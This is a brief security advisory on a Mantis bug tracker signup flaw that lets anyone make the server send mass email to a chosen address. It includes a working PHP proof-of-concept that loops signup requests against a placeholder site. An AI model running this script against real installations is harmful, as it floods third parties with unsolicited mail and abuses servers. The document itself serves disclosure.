source: http://www.securityfocus.com/bid/10995/info

Mantis is reportedly susceptible to a vulnerability in its signup process allowing mass email attacks.

When a new user signs up to Mantis, the system automatically sends an email message to the given email address. This email contains the users new password for the affected Mantis bug tracking system.

Mantis fails to ensure that only one account exists with the specified email address, and therefor an attacker can create a massive amount of email, directed at any target they wish. This email will originate from the Mantis server, and not the attacker.

The vendor has implemented a captcha system for new account signup requests in the CVS version of the software. All currently released versions of the software are reported vulnerable. 

<?php

//Please, change it becuase is my e-mail :)
$email = "anyemail@address";
$base_user = "test";
$i = 0;
$site = "http://www.example.com";

for ($i=0;$i<=15;$i++)
{
echo("Sending e-mail number $i\n");
$user = "$base_user$i";
echo("New user is $user\n");
$url =
"http://$site/signup.php?username=$user&email=$email";
echo("URL is $url\n");
$fd = fopen($url,"r");
echo("E-mail $i sended\n");
fclose($fd);
}

?>

